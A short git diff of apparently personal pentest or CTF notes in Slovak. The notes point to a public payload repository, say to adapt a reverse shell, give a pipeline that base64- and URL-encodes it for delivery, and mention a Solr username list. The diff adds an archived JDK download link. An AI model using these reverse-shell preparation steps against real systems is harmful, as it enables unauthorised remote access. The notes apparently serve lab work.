@@ -8,3 +8,8 @@ https://github.com/swisskyrepo/PayloadsAllTheThings - uprav reverse shell - /dev
 | base64 | tr -d "\n" | sed -e 's/+/%20/g' - preved revshell na base64
 
 vytvor si solr username list
+
+
+
+
+https://web.archive.org/web/20160914160324/https://download.oracle.com/otn/java/jdk/8u20-b26/jdk-8u20-linux-x64.tar.gz
